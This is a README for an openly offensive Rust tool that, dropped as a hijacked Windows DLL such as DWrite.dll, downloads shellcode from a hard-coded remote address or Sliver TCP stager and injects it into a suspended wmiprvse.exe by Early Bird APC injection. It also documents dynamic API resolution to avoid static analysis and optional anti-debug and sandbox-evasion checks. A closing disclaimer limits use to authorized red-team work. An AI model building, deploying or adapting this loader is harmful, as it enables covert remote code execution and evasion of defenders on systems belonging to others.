# RustHarderDll

A Rust-based DLL hijacking / proxy loader for Windows that delivers shellcode into a remote process via Early Bird APC injection.

Based on [tehstoni/RustHarder](https://github.com/tehstoni/RustHarder) — all credits for the original concept.

---

## Overview

RustHarderDll compiles to a Windows `cdylib` (DLL). When dropped into a target application's directory under the name of a DLL it loads (e.g. `DWrite.dll`), it:

1. **Forwards exports** from the real system DLL so the host application continues to function normally.
2. **On `DLL_PROCESS_ATTACH`**, spawns a background thread that fetches and injects a shellcode payload.

---

## Injection Flow

### 1. DLL Proxy (`src/lib.rs`)

`DllMain` handles `DLL_PROCESS_ATTACH` by spawning a thread that calls `injection::run_me_for_success()`. A lock file guard (`dbgcore.lock`) exists in the source but is currently disabled — enable it to prevent double-execution when debugging.

Current proxy export stub (targeting `DWrite.dll`):

```rust
#[unsafe(no_mangle)]  // DWrite.dll
fn DWriteCreateFactory() {}
```

### 2. Payload Delivery (`src/injection.rs`)

`get_payload_from_url` supports three schemes:

| Scheme | Transport | Notes |
|---|---|---|
| `http://` | HTTP via `reqwest` | Plain HTTP download |
| `https://` | HTTPS via `reqwest` | TLS HTTP download |
| `tcp://host:port` | Raw TCP | 4-byte LE length prefix + body; compatible with Sliver stager listeners |

```rust
fn download_binary_to_vec(addr: &str, timeout: Duration) -> Result<Vec<u8>, ...> {
    // reads 4-byte little-endian length, then exactly that many bytes
}
```

### 3. Early Bird APC Injection

All Win32 API names are resolved dynamically at runtime from character arrays to avoid static import analysis:

```
CreateProcessA  →  VirtualAllocEx  →  WriteProcessMemory  →  QueueUserAPC
```

Injection steps:

1. Spawn `wmiprvse.exe` (or any target) in `CREATE_SUSPENDED` state.
2. `VirtualAllocEx` — allocate page-aligned `RWX` memory in the target process.
3. `WriteProcessMemory` — copy shellcode into the allocation.
4. `QueueUserAPC` — queue the shellcode address as an APC on the suspended thread.
5. `ResumeThread` — shellcode executes before any user code runs (Early Bird).

---

## Project Structure

```
RustHarderDll/
├── src/
│   ├── lib.rs          # DllMain, DLL proxy export stubs, attach() thread
│   └── injection.rs    # Payload fetch, evasion routines, APC injection
├── VersionDllCrate/    # rustdllproxy-generated export stubs (reference)
└── Cargo.toml
```

---

## Building

Requires the `x86_64-pc-windows-msvc` Rust toolchain.

```bash
cargo build --release
```

Output: `target/release/rust_harder_dll.dll` — rename to match your target DLL (e.g. `DWrite.dll`).

---

## DLL Proxy Setup

Use `rustdllproxy` to generate export stubs for any system DLL:

```bash
cargo install rustdllproxy

# Example: generate stubs for dbgcore.dll
rustdllproxy.exe -p dbgcore.dll -o VersionDllCrate -n VersionDllProxy
```

Copy the generated `#[no_mangle]` stubs into `src/lib.rs`. Examples:

**DWrite.dll** (current):
```rust
#[unsafe(no_mangle)]
fn DWriteCreateFactory() {}
```

**dbgcore.dll** (alternative):
```rust
#[unsafe(no_mangle)]
fn MiniDumpReadDumpStream() {}
#[unsafe(no_mangle)]
fn MiniDumpWriteDump() {}
```

---

## Configuration

### Payload URL (`src/injection.rs`)

```rust
let url = "http://192.168.15.104:8443/agent.x64.bin";  // HTTP
// let url = "tcp://192.168.15.104:8443";               // Sliver TCP stager
```

### Injection target process

```rust
let target_process = CString::new("C:\\Windows\\System32\\wbem\\wmiprvse.exe").unwrap();
// let target_process = CString::new("C:\\Windows\\System32\\cmd.exe").unwrap();
```

---

## Evasion Toggles

All evasion features are present in source but currently **disabled**. Uncomment to enable:

| Toggle | Location | What it does |
|---|---|---|
| `evade()` — pre-injection | `run_me_for_success()` | Timing + anti-debug check before creating target process |
| `evade()` — post-resume | after `ResumeThread` | Second timing check after injection |
| RAM size check | inside `evade()` | Exits if system has ≤ 1 GB RAM (sandbox indicator) |
| Lock file guard | `attach()` | Creates `dbgcore.lock` to prevent re-injection on repeated DLL loads |

`enhanced_anti_debugging()` uses a randomized heap allocation and `GetCurrentThreadId` timing loops as a lightweight debugger heuristic.

---

## Dependencies

| Crate | Purpose |
|---|---|
| `winapi` | Win32 bindings: process, memory, thread, system info APIs |
| `windows` | WinRT/Win32 types for `DllMain` signature (`HINSTANCE`, `DLL_PROCESS_ATTACH`) |
| `reqwest` (blocking) | HTTP/HTTPS payload download |
| `dllproxymacros` | `prehook` / `posthook` / `fullhook` macros for DLL forwarding |

---

## Legal / Ethical Use

This tool is intended for **authorized penetration testing, red team engagements, and security research only**. Do not use against systems you do not own or have explicit written permission to test.
